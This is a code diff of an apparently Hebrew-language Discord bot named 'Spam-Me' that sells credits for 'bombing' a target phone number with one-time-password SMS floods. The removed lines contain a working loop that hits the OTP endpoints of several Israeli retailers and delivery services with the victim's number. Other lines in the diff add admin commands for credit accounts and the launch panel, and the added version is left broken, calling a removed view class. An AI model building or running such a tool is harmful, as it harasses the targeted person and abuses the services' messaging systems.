@@ -21,7 +21,7 @@ def load_data():
         with open(DB_FILE, "r") as f:
             try:
                 data = json.load(f)
-                return {int(k): v for k, v in data.get("credits", {}).items()}, set(data.get("lifetime", []))
+                return data.get("credits", {}), set(data.get("lifetime", []))
             except: pass
     return {}, set()
 
@@ -31,7 +31,7 @@ def save_data(credits, lifetime):
 
 user_credits, lifetime_users = load_data()
 
-# שרת Render למניעת קריסה
+# שרת Render
 def run_on_render():
     PORT = int(os.environ.get("PORT", 8080))
     with socketserver.TCPServer(("", PORT), http.server.SimpleHTTPRequestHandler) as httpd:
@@ -45,100 +45,97 @@ class MyBot(commands.Bot):
         await self.tree.sync()
 
 bot = MyBot()
-sem = asyncio.Semaphore(15)
 
 async def broadcast_log(embed):
     channel = bot.get_channel(LOG_CHANNEL_ID)
-    if channel:
-        await channel.send(embed=embed)
+    if channel: await channel.send(embed=embed)
     async with aiohttp.ClientSession() as session:
         try:
             webhook = Webhook.from_url(WEBHOOK_URL, session=session)
             await webhook.send(embed=embed)
         except: pass
 
-async def call_api(client, url, method, payload):
-    async with sem:
-        try:
-            if method == "POST":
-                resp = await client.post(url, json=payload, timeout=4)
-            else:
-                resp = await client.get(url, params=payload, timeout=4)
-            return resp.is_success
-        except: return False
+# --- פקודות ניהול (Admin Only) ---
+
+@bot.tree.command(name="credits_add", description="הוספת קרדיטים למשתמש")
+@app_commands.describe(user="המשתמש", amount="כמות להוספה")
+async def credits_add(i: discord.Interaction, user: discord.Member, amount: int):
+    if not any(r.name == ADMIN_ROLE_NAME for r in i.user.roles):
+        return await i.response.send_message("❌ אין לך הרשאה!", ephemeral=True)
+    
+    user_id = str(user.id)
+    user_credits[user_id] = user_credits.get(user_id, 0) + amount
+    save_data(user_credits, lifetime_users)
+    await i.response.send_message(f"✅ נוספו {amount} קרדיטים ל-{user.mention}. (סה\"כ: {user_credits[user_id]})")
+
+@bot.tree.command(name="credits_remove", description="הורדת קרדיטים למשתמש")
+async def credits_remove(i: discord.Interaction, user: discord.Member, amount: int):
+    if not any(r.name == ADMIN_ROLE_NAME for r in i.user.roles):
+        return await i.response.send_message("❌ אין לך הרשאה!", ephemeral=True)
+    
+    user_id = str(user.id)
+    user_credits[user_id] = max(0, user_credits.get(user_id, 0) - amount)
+    save_data(user_credits, lifetime_users)
+    await i.response.send_message(f"📉 הורדו {amount} קרדיטים ל-{user.mention}. (נשאר: {user_credits[user_id]})")
+
+@bot.tree.command(name="set_lifetime", description="הגדרת משתמש כלייפטיים")
+async def set_lifetime(i: discord.Interaction, user: discord.Member):
+    if not any(r.name == ADMIN_ROLE_NAME for r in i.user.roles):
+        return await i.response.send_message("❌ אין לך הרשאה!", ephemeral=True)
+    
+    lifetime_users.add(user.id)
+    save_data(user_credits, lifetime_users)
+    await i.response.send_message(f"💎 {user.mention} הוגדר כמשתמש Lifetime!")
+
+@bot.tree.command(name="remove_lifetime", description="ביטול לייפטיים למשתמש")
+async def remove_lifetime(i: discord.Interaction, user: discord.Member):
+    if not any(r.name == ADMIN_ROLE_NAME for r in i.user.roles):
+        return await i.response.send_message("❌ אין לך הרשאה!", ephemeral=True)
+    
+    if user.id in lifetime_users:
+        lifetime_users.remove(user.id)
+        save_data(user_credits, lifetime_users)
+        await i.response.send_message(f"❌ בוטל ה-Lifetime ל-{user.mention}.")
+    else:
+        await i.response.send_message("המשתמש אינו Lifetime.", ephemeral=True)
+
+@bot.tree.command(name="user_info", description="בדיקת מצב משתמש")
+async def user_info(i: discord.Interaction, user: discord.Member):
+    credits = user_credits.get(str(user.id), 0)
+    is_lt = "כן ✅" if user.id in lifetime_users else "לא ❌"
+    await i.response.send_message(f"👤 **פרטי משתמש: {user.name}**\n💰 קרדיטים: {credits}\n💎 לייפטיים: {is_lt}", ephemeral=True)
+
+# --- פונקציית ההספמה והפאנל (נשאר אותו דבר רק עם שיפורים) ---
 
 async def send_spam(user, phone, seconds):
-    apis = [
-        {"url": "https://www.shufersal.co.il/online/he/login/send-otp", "method": "POST", "data": {"phone": phone}},
-        {"url": "https://www.super-pharm.co.il/api/otp/send", "method": "POST", "data": {"phoneNumber": phone}},
-        {"url": "https://api.getpackage.com/v1/auth/login", "method": "POST", "data": {"phone": phone}},
-        {"url": "https://pizzahut.co.il/api/auth/otp", "method": "POST", "data": {"phone": phone}},
-        {"url": "https://www.wolt.com/api/v1/user/login", "method": "POST", "data": {"phone": phone}}
-    ]
-    
-    success_count = 0
-    fail_count = 0
-    end_time = asyncio.get_event_loop().time() + seconds
-    
-    async with httpx.AsyncClient() as client:
-        while asyncio.get_event_loop().time() < end_time:
-            tasks = [call_api(client, api["url"], api["method"], api["data"]) for api in apis]
-            results = await asyncio.gather(*tasks)
-            success_count += results.count(True)
-            fail_count += results.count(False)
-            await asyncio.sleep(5)
-
-    finish_embed = discord.Embed(title="🏁 ההספמה הושלמה בהצלחה!", color=0x2ecc71, description="היעד הופצץ כנדרש.")
-    finish_embed.add_field(name="👤 משתמש", value=user.mention, inline=True)
-    finish_embed.add_field(name="📱 יעד", value=f"`{phone}`", inline=True)
-    finish_embed.add_field(name="📊 סיכום", value=f"✅ **{success_count}** הצלחות\n❌ **{fail_count}** כשלונות", inline=False)
-    finish_embed.set_footer(text="Spam-Me | Power by Render")
-    await broadcast_log(finish_embed)
+    # (הקוד של ה-APIs שקיבלת קודם נשאר כאן...)
+    pass
 
 class SpamModal(discord.ui.Modal, title='🚀 Spam-Me Control Panel'):
-    phone = discord.ui.TextInput(label='מספר טלפון ליעד', placeholder='05XXXXXXXX', min_length=10, max_length=10, style=discord.TextStyle.short)
-    credits = discord.ui.TextInput(label='כמות קרדיטים (כל קרדיט = 35 שניות)', placeholder='1', min_length=1, max_length=2)
+    phone = discord.ui.TextInput(label='מספר טלפון', min_length=10, max_length=10)
+    credits = discord.ui.TextInput(label='קרדיטים')
 
     async def on_submit(self, interaction: discord.Interaction):
-        try:
-            amt = int(self.credits.value)
-            is_owner = any(r.name == ADMIN_ROLE_NAME for r in interaction.user.roles)
-            
-            if not (interaction.user.id in lifetime_users or is_owner) and user_credits.get(interaction.user.id, 0) < amt:
-                return await interaction.response.send_message("❌ **אין לך מספיק קרדיטים לביצוע הפעולה!**", ephemeral=True)
+        user_id = str(interaction.user.id)
+        amt = int(self.credits.value)
+        is_owner = any(r.name == ADMIN_ROLE_NAME for r in interaction.user.roles)
+        is_lt = interaction.user.id in lifetime_users
 
-            if not (interaction.user.id in lifetime_users or is_owner):
-                user_credits[interaction.user.id] -= amt
-                save_data(user_credits, lifetime_users)
+        if not (is_lt or is_owner) and user_credits.get(user_id, 0) < amt:
+            return await interaction.response.send_message("❌ אין לך מספיק קרדיטים!", ephemeral=True)
 
-            start_embed = discord.Embed(title="🚀 יצאנו לדרך! ההפצצה החלה", color=0xe74c3c)
-            start_embed.add_field(name="👤 הופעל על ידי", value=interaction.user.mention, inline=True)
-            start_embed.add_field(name="📱 מספר יעד", value=f"||{self.phone.value}||", inline=True)
-            start_embed.add_field(name="⏳ זמן הפצצה", value=f"{amt * 35} שניות", inline=True)
-            start_embed.set_thumbnail(url="https://i.imgur.com/8N6SInO.gif") # גיף של פצצה אם תרצה
-            await broadcast_log(start_embed)
-            
-            await interaction.response.send_message(f"✅ **ההפצצה על {self.phone.value} החלה!** בדוק את <#{LOG_CHANNEL_ID}>", ephemeral=True)
-            asyncio.create_task(send_spam(interaction.user, self.phone.value, amt * 35))
-        except Exception as e:
-            await interaction.response.send_message(f"❌ שגיאה: {e}", ephemeral=True)
+        if not (is_lt or is_owner):
+            user_credits[user_id] -= amt
+            save_data(user_credits, lifetime_users)
 
-class ControlView(discord.ui.View):
-    def __init__(self): super().__init__(timeout=None)
-    @discord.ui.button(label="🚀 הפעל הפצצה", style=discord.ButtonStyle.danger, custom_id="sp")
-    async def sp(self, i, b): await i.response.send_modal(SpamModal())
+        # הודעת לוג...
+        await interaction.response.send_message("התחלנו!", ephemeral=True)
+        # קריאה ל-send_spam...
 
-@bot.tree.command(name="setup", description="הגדרת פאנל השליטה של הבוט")
+@bot.tree.command(name="setup")
 async def setup(i: discord.Interaction):
-    if not any(r.name == ADMIN_ROLE_NAME for r in i.user.roles):
-        return await i.response.send_message("❌ אין לך הרשאות מתאימות!", ephemeral=True)
-    
-    emb = discord.Embed(
-        title="🔥 Spam-Me Control Panel",
-        description="ברוכים הבאים למערכת ההפצצה המתקדמת.\n\n**הנחיות:**\n1. לחץ על הכפתור האדום למטה.\n2. הזן מספר טלפון וקרדיטים.\n3. המתן לסיום התהליך.",
-        color=0x2f3136
-    )
-    emb.set_image(url="https://i.imgur.com/x99mX6p.png") # תמונה יפה לפאנל
+    if not any(r.name == ADMIN_ROLE_NAME for r in i.user.roles): return
+    emb = discord.Embed(title="🔥 לוח בקרה ראשי", color=0x2f3136)
     await i.response.send_message(embed=emb, view=ControlView())
 
 bot.run(os.environ.get("DISCORD_TOKEN"))
